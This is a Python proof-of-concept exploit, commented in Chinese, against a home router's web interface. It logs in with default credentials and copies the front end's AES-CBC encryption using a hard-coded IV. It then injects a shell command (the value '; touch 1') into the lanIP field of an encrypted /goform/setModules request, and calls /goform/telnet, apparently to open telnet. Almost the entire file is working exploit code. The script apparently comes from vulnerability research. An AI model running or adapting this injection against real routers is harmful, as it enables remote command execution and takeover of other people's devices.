from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from hashlib import md5
import base64
import requests
import logging
import json


# === 配置 ===
IV = "EU5H62G9ICGRNI43".encode("utf-8")
# KEY = "AzJ5oYHGLQvvIQIR".encode("utf-8")
HOST = "192.168.2.1"
PORT = 80
URL = f"http://{HOST}:{PORT}"

USERNAME = "admin"
PASSWORD = "12345678"

# AES block size = 16 bytes
BLOCK_SIZE = 16

# logging
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

def encrypt(data: str, key: bytes) -> str:
    """模仿 JS 的 l.b.encrypt，AES-CBC + PKCS7，返回 Base64"""

    cipher = AES.new(key, AES.MODE_CBC, IV)

    # JS 中若为对象就 JSON.stringify，因此 Python 中由调用者决定提供字符串
    data_bytes = data.encode("utf-8")

    encrypted = cipher.encrypt(pad(data_bytes, BLOCK_SIZE))

    # JS 中是 Base64.stringify(ciphertext)
    return base64.b64encode(encrypted).decode("utf-8")


def decrypt(b64_ciphertext: str, key: bytes) -> str:
    """模仿 JS 的 l.b.decrypt，接收 Base64，加密模式同上"""

    cipher = AES.new(key, AES.MODE_CBC, IV)

    ciphertext = base64.b64decode(b64_ciphertext)

    decrypted = unpad(cipher.decrypt(ciphertext), BLOCK_SIZE)

    return decrypted.decode("utf-8")

class RouterExploit:
    def __init__(self):
        self.session = requests.Session()
        self.stok = None
        self.sign = None

    def logout(self):
        """在login时可能会需要这个来先清空一下"""

    def login(self, username:str, password:str):
        """登录，password 需要进行 md5"""
        obj = md5()
        obj.update(password.encode("utf-8"))
        pass_md5 = obj.hexdigest().upper()
        logger.info(f"Login in with username {username}, password: {password}, md5_pass: {pass_md5}")

        header = {
            "Content-Type": "application/json; charset=UTF-8",
            "Referer": URL+"/login.html",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0"
        }
        data = {
            "userName": username,
            "password": pass_md5
        }
        # self.session.headers = header
        res = self.session.post(URL+"/login/Auth", json=data, allow_redirects=True)
        logger.debug(f"login response: {res.status_code}, {res.text}")
        self.stok = res.json().get("stok")
        self.sign = res.json().get("sign")


    def test_poc(self):
        """验证 poc """
        data = {
            "lanCfg": {
                "lanIP": "; touch 1",
                "lanMask": "255.255.255.0",
                "dhcpEn": True,
                "dhcpRange": "1",
                "dhcpLeaseTime": "0",
                "lanDnsEn": False,
                "endIP": "192.168.2.254",
                "startIP": "192.168.2.1"
            }
        }
        enc_data = {
            "data": encrypt(json.dumps(data), self.sign.encode("utf-8"))
        }
        logger.debug(f"encrypted request payload: {enc_data}")
        res = self.session.post(URL+f"/;stok={self.stok}"+"/goform/setModules?modules=lanCfg", json=enc_data)
        plain_res = decrypt(res.json().get("data"), self.sign.encode("utf-8"))
        logger.info(f"Request return: {plain_res}")

        res = self.session.get(URL+f"/goform/telnet")



if __name__ == "__main__":
    exploit = RouterExploit()
    exploit.login(USERNAME, PASSWORD)
    exploit.test_poc()
